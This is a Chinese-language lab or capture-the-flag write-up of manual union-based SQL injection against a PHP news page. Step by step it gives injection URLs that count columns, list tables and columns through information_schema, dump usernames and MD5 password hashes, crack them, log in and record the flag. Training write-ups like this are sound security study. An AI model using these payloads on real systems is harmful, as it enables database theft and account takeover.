#### SQL 手工注入

1. 判断是否存注入点

   http://124.70.22.208:43505/new_list.php?id=-1

   错误回显，存在注入
2. order by 判断列的数量，发现为四字段

   http://124.70.22.208:43505/new_list.php?id=-1 order by 1,2 ,3,4
3. http://124.70.22.208:43505/new_list.php?id=-1 union select 1,2,3,4

   2位置的内容回显在标题，3位置的内容回显在文章中
4. 查询当前使用的数据库，将回显点任意一个的位置改成database()，发现当前数据库是mozhe_Discuz_StormGroup
5. 通过查询数据库版本，为高版本数据库，有information_schema库中有COLUMNS储存所有数据库中的列名，有TABLES储存所有数据库中的表名
6. http://124.70.22.208:43505/new_list.php?id=-1 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA='mozhe_Discuz_StormGroup'

   查询mozhe_Discuz_StormGroup数据库下的所有表名：

   1. TABLES_SCHEMA列名是该表所属的数据库
   2. group_concat(列名)会将查到的该列名集合成一个字符串输出，查询所有的表名

   结果为：**StormGroup_member,notice**

   猜测notice就是一开始页面正常显示的文字，查询StormGroup_member中的内容即可
7. 查询StormGroup_member下的列名：

   http://124.70.22.208:43505/new_list.php?id=-1 union select 1,group_concat(COLUMN_NAME),3,4 from information_schema.COLUMNS where TABLE_NAME='StormGroup_member'

   结果为：**id,name,password,status**
8. 查询StormGroup_member下的name和password内容：

   http://124.70.22.208:43505/new_list.php?id=-1 union select 1,group_concat(name),group_concat(password),4 from mozhe_Discuz_StormGroup.StormGroup_member

   结果为：mozhe,mozhe

   356f589a7df439f6f744ff19bb8092c0,318f679292e0d21471fe4b822e9cf855
9. 通过MD5解密，得到两个密码依次登录，第一个无效第二个成功登录
10. key：mozhea582d7131c4a0016cb331833a8b
